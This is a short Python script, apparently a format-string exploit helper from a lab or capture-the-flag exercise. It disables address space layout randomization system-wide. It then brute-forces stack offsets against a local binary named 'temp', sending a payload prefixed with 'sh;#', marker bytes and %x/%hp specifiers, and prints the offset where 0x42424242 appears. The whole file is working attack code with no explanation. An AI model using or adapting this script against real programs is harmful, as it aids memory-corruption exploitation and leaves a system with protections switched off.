#! /usr/bin/env python

import subprocess

# important! Disable mempory randomization
subprocess.Popen("echo 0 > /proc/sys/kernel/randomize_va_space", shell=True, stdout=subprocess.PIPE)

for i in range(0, 200):
    toex = "env -i ./temp \"$(python -c 'import sys; sys.stdout.write(\"sh;#AAAABBBB%00000x%"
    toex += str(i) + "$hp%00000x%" + str(i + 1) + "$hp\")')\""

    output = str(i) + ": " + subprocess.Popen(toex, shell=True, stdout=subprocess.PIPE).stdout.read()

    if "0x42424242" in output:
        print output
